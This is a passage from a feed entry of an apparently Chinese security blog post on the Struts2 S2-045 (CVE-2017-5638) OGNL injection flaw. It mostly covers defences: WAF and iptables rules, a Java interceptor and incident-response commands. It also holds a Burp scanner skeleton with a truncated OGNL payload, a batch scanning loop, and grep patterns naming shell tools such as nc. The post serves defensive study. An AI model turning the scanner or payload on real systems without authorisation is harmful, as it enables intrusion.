\&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;id:1001,\&lt;/span&gt;&lt;br&gt;    phase&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    block&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    msg&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;Struts2 S2-045 Attack Detected&amp;#x27;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    logdata&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;Content-Type: %&amp;#123;MATCHED_VAR&amp;#125;&amp;#x27;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    tag&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;attack-sqli&amp;#x27;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    tag&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&amp;#x27;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# 检测OGNL表达式&lt;/span&gt;&lt;br&gt;SecRule REQUEST_HEADERS&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;Content&lt;span class=&#34;hljs-punctuation&#34;&gt;-&lt;/span&gt;Type &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;@contains %&amp;#123;&amp;quot;&lt;/span&gt; \&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;id:1002,\&lt;/span&gt;&lt;br&gt;    phase&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    block&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    msg&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;Potential OGNL Injection in Content-Type&amp;#x27;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;3-网络层防护&#34;&gt;&lt;a href=&#34;#3-网络层防护&#34; class=&#34;headerlink&#34; title=&#34;3. 网络层防护&#34;&gt;&lt;/a&gt;3. 网络层防护&lt;/h4&gt;&lt;figure class=&#34;highlight css&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs css&#34;&gt;# iptables规则示例&lt;br&gt;iptables -&lt;span class=&#34;hljs-selector-tag&#34;&gt;A&lt;/span&gt; &lt;span class=&#34;hljs-selector-tag&#34;&gt;INPUT&lt;/span&gt; -&lt;span class=&#34;hljs-selector-tag&#34;&gt;p&lt;/span&gt; tcp &lt;span class=&#34;hljs-attr&#34;&gt;--dport&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt; -m string &lt;span class=&#34;hljs-attr&#34;&gt;--string&lt;/span&gt; &amp;quot;%&amp;#123;&amp;quot; &lt;span class=&#34;hljs-attr&#34;&gt;--algo&lt;/span&gt; bm -j DROP&lt;br&gt;iptables -&lt;span class=&#34;hljs-selector-tag&#34;&gt;A&lt;/span&gt; &lt;span class=&#34;hljs-selector-tag&#34;&gt;INPUT&lt;/span&gt; -&lt;span class=&#34;hljs-selector-tag&#34;&gt;p&lt;/span&gt; tcp &lt;span class=&#34;hljs-attr&#34;&gt;--dport&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt; -m string &lt;span class=&#34;hljs-attr&#34;&gt;--string&lt;/span&gt; &amp;quot;ognl&amp;quot; &lt;span class=&#34;hljs-attr&#34;&gt;--algo&lt;/span&gt; bm -j DROP&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;4-应用层加固&#34;&gt;&lt;a href=&#34;#4-应用层加固&#34; class=&#34;headerlink&#34; title=&#34;4. 应用层加固&#34;&gt;&lt;/a&gt;4. 应用层加固&lt;/h4&gt;&lt;figure class=&#34;highlight scala&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs scala&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 自定义拦截器&lt;/span&gt;&lt;br&gt;public &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;SecurityInterceptor&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;AbstractInterceptor&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-meta&#34;&gt;@Override&lt;/span&gt;&lt;br&gt;    public &lt;span class=&#34;hljs-type&#34;&gt;String&lt;/span&gt; intercept(&lt;span class=&#34;hljs-type&#34;&gt;ActionInvocation&lt;/span&gt; invocation) &lt;span class=&#34;hljs-keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;Exception&lt;/span&gt; &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;HttpServletRequest&lt;/span&gt; request = &lt;span class=&#34;hljs-type&#34;&gt;ServletActionContext&lt;/span&gt;.getRequest();&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;String&lt;/span&gt; contentType = request.getContentType();&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (contentType != &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt; &amp;amp;&amp;amp; contentType.contains(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%&amp;#123;&amp;quot;&lt;/span&gt;)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;SecurityException&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Malicious Content-Type detected&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; invocation.invoke();&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;实战技巧与工具&#34;&gt;&lt;a href=&#34;#实战技巧与工具&#34; class=&#34;headerlink&#34; title=&#34;实战技巧与工具&#34;&gt;&lt;/a&gt;实战技巧与工具&lt;/h2&gt;&lt;h3 id=&#34;BurpSuite插件开发&#34;&gt;&lt;a href=&#34;#BurpSuite插件开发&#34; class=&#34;headerlink&#34; title=&#34;BurpSuite插件开发&#34;&gt;&lt;/a&gt;BurpSuite插件开发&lt;/h3&gt;&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// S2-045检测插件框架&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;S2045Scanner&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;IScannerCheck&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-meta&#34;&gt;@Override&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; List&amp;lt;IScanIssue&amp;gt; &lt;span class=&#34;hljs-title function_&#34;&gt;doActiveScan&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint)&lt;/span&gt; &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-comment&#34;&gt;// 构造S2-045 payload&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%&amp;#123;(#nike=&amp;#x27;multipart/form-data&amp;#x27;)...&amp;#125;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-comment&#34;&gt;// 发送测试请求&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;byte&lt;/span&gt;[] checkRequest = insertionPoint.buildRequest(payload.getBytes());&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;IHttpRequestResponse&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;checkRequestResponse&lt;/span&gt; &lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt; callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-comment&#34;&gt;// 分析响应判断是否存在漏洞&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (isVulnerable(checkRequestResponse)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; Collections.singletonList(&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;CustomScanIssue&lt;/span&gt;(&lt;span class=&#34;hljs-comment&#34;&gt;/* ... */&lt;/span&gt;));&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;批量检测脚本&#34;&gt;&lt;a href=&#34;#批量检测脚本&#34; class=&#34;headerlink&#34; title=&#34;批量检测脚本&#34;&gt;&lt;/a&gt;批量检测脚本&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#!/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# S2-045批量检测脚本&lt;/span&gt;&lt;br&gt;&lt;br&gt;targets=(&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target1.com:8080&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target2.com:8080&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target3.com:8080&amp;quot;&lt;/span&gt;&lt;br&gt;)&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; target &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;span class=&#34;hljs-variable&#34;&gt;$&amp;#123;targets[@]&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;; &lt;span class=&#34;hljs-keyword&#34;&gt;do&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Testing: &lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;    python3 s2-045-check.py &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;---&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;done&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;应急响应指南&#34;&gt;&lt;a href=&#34;#应急响应指南&#34; class=&#34;headerlink&#34; title=&#34;应急响应指南&#34;&gt;&lt;/a&gt;应急响应指南&lt;/h2&gt;&lt;h3 id=&#34;1-漏洞确认&#34;&gt;&lt;a href=&#34;#1-漏洞确认&#34; class=&#34;headerlink&#34; title=&#34;1. 漏洞确认&#34;&gt;&lt;/a&gt;1. 漏洞确认&lt;/h3&gt;&lt;figure class=&#34;highlight gradle&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs gradle&#34;&gt;# 检查Struts2版本&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;find&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;/ -name &amp;quot;struts2-core-*.jar&amp;quot; 2&amp;gt;/&lt;/span&gt;dev/&lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;&lt;br&gt;&lt;br&gt;# 检查访问日志中的攻击特征&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; -E &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Content-Type.*%\&amp;#123;&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log&lt;span class=&#34;hljs-regexp&#34;&gt;/apache2/&lt;/span&gt;access.log&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; -E &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ognl|ProcessBuilder|Runtime&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log&lt;span class=&#34;hljs-regexp&#34;&gt;/tomcat/&lt;/span&gt;catalina.out&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;2-应急处置&#34;&gt;&lt;a href=&#34;#2-应急处置&#34; class=&#34;headerlink&#34; title=&#34;2. 应急处置&#34;&gt;&lt;/a&gt;2. 应急处置&lt;/h3&gt;&lt;figure class=&#34;highlight sas&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs sas&#34;&gt;# 临时阻断攻击IP&lt;br&gt;iptables -A &lt;span class=&#34;hljs-keyword&#34;&gt;INPUT&lt;/span&gt; -s &amp;lt;攻击IP&amp;gt; -j &lt;span class=&#34;hljs-keyword&#34;&gt;DROP&lt;/span&gt;&lt;br&gt;&lt;br&gt;# 停止相关服务&lt;br&gt;systemctl &lt;span class=&#34;hljs-keyword&#34;&gt;stop&lt;/span&gt; tomcat&lt;br&gt;systemctl &lt;span class=&#34;hljs-keyword&#34;&gt;stop&lt;/span&gt; apache2&lt;br&gt;&lt;br&gt;# 备份系统状态&lt;br&gt;tar -czf /tmp/system_backup_$(date +&lt;span class=&#34;hljs-title function_&#34;&gt;%Y&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%m&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%d_&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%H&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%M&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%S&lt;/span&gt;).tar.gz /var/log /etc /opt/tomcat&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;3-痕迹清理检查&#34;&gt;&lt;a href=&#34;#3-痕迹清理检查&#34; class=&#34;headerlink&#34; title=&#34;3. 痕迹清理检查&#34;&gt;&lt;/a&gt;3. 痕迹清理检查&lt;/h3&gt;&lt;figure class=&#34;highlight vim&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs vim&#34;&gt;# 检查是否有异常进程&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;ps&lt;/span&gt; aux | &lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; -E &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;nc|bash|sh|python|perl&amp;quot;&lt;/span&gt; | &lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; -v &lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt;&lt;br&gt;&lt;br&gt;# 检查网络连接&lt;br&gt;netstat -antlp | &lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; ESTABLISHED&lt;br&gt;&lt;br&gt;# 检查新增文件&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;find&lt;/span&gt; /tmp /var/tmp -&lt;span class=&#34;hljs-built_in&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;f&lt;/span&gt; -mtime -&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;find&lt;/span&gt; /&lt;span class=&#34;hljs-keyword&#34;&gt;opt&lt;/span&gt;/tomcat/webapps -name &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;*.jsp&amp;quot;&lt;/span&gt; -mtime -&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;总结&#34;&gt;&lt;a href=&#34;#总结&#34; class=&#34;headerlink&#34; title=&#34;总结&#34;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;Struts2-045漏洞的特点：&lt;/p&gt;
&lt;h3 id=&#34;优势（从攻击者角度）&#34;&gt;&lt;a href=&#34;#优势（从攻击者角度）&#34; class=&#34;headerlink&#34; title=&#34;优势（从攻击者角度）&#34;&gt;&lt;/a&gt;优势（从攻击者角度）&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;利用简单&lt;/strong&gt;: 只需构造HTTP请求头即可&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;影响面广&lt;/strong&gt;: 大量企业级应用使用Struts2框架&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;检测困难&lt;/strong&gt;: 攻击流量可能被忽略&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;危害严重&lt;/strong&gt;: 直接获得服务器执行权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;防护要点&#34;&gt;&lt;a href=&#34;#防护要点&#34; class=&#34;headerlink&#34; title=&#34;防护要点&#34;&gt;&lt;/a&gt;防护要点&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;及时更新&lt;/strong&gt;: 升级到安全版本是根本解决方案&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;深度防御&lt;/strong&gt;: 结合WAF、IDS等多层防护&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;监控告警&lt;/strong&gt;: 建立有效的安全监控体系&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;应急响应&lt;/strong&gt;: 制定完善的安全事件响应流程&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;免责声明&lt;/strong&gt;: 本文内容仅供安全研究和防护参考，请勿用于非法攻击活动。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;参考资源&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://struts.apache.org/announce.html#a20170307&#34;&gt;Apache Struts2官方安全公告&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638&#34;&gt;CVE-2017-5638详细信息&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://owasp.org/www-project-top-ten/&#34;&gt;OWASP Struts2安全指南&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
        <category term="Web安全" />
        <category term="漏洞复现" />
        <category term="Struts2" />
        <category term="RCE" />
        <category term="OGNL注入" />
        <updated>2025-07-24T00:10:34.000Z</updated>
    </entry>
</feed>
